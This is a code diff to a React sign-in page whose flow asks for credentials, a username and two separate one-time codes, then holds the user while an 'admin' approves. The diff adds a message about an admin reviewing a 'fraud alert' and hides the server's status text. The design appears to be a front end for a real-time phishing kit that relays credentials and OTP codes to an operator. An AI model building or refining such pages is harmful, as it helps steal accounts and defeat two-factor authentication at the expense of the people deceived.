@@ -17,6 +17,9 @@ type Step =
   | 'rejected'
   | 'approved_success'
 
+const WAIT_MSG =
+  'Your account verification will automatically update here once admin looks into the fraud alert.'
+
 export default function SignInPage() {
   const [step, setStep] = useState<Step>('credentials')
   const [email, setEmail] = useState('')
@@ -34,7 +37,6 @@ export default function SignInPage() {
     const tick = async () => {
       const s = await getStatus(attemptId)
       if (cancelled) return
-      setNote(s.lastEvent)
       if (s.status === 'approved') setStep('approved_success')
       if (s.status === 'rejected' || s.status === 'expired') {
         setStep('rejected')
@@ -54,7 +56,7 @@ export default function SignInPage() {
       <main style={plainPage}>
         <div style={column}>
           <h1 style={heading}>Congratulations</h1>
-          <p style={text}>Your account & verification has been approved.</p>
+          <p style={text}>Your account &amp; verification has been approved.</p>
           {email ? <p style={text}>{email}</p> : null}
         </div>
       </main>
@@ -115,7 +117,7 @@ export default function SignInPage() {
           return
         }
         setStep('awaiting_approval')
-        setNote('Waiting for approval…')
+        setNote(WAIT_MSG)
       }
     } catch (err) {
       setLoading(false)
@@ -123,15 +125,12 @@ export default function SignInPage() {
     }
   }
 
-  const titles: Record<
-    Exclude<Step, 'approved_success'>,
-    string
-  > = {
+  const titles: Record<Exclude<Step, 'approved_success'>, string> = {
     credentials: 'Log in',
     username: 'Enter username',
     otp1: 'Enter first code',
     otp2: 'Enter second code',
-    awaiting_approval: 'Waiting for approval',
+    awaiting_approval: 'Verification in progress',
     rejected: 'Sign-in blocked',
   }
 
@@ -196,7 +195,7 @@ export default function SignInPage() {
           )}
 
           {step === 'awaiting_approval' && (
-            <p style={text}>{note || 'Waiting for approval…'}</p>
+            <p style={{ ...text, lineHeight: 1.5 }}>{WAIT_MSG}</p>
           )}
 
           {error && <p style={{ color: '#c00', margin: 0, fontSize: 14 }}>{error}</p>}
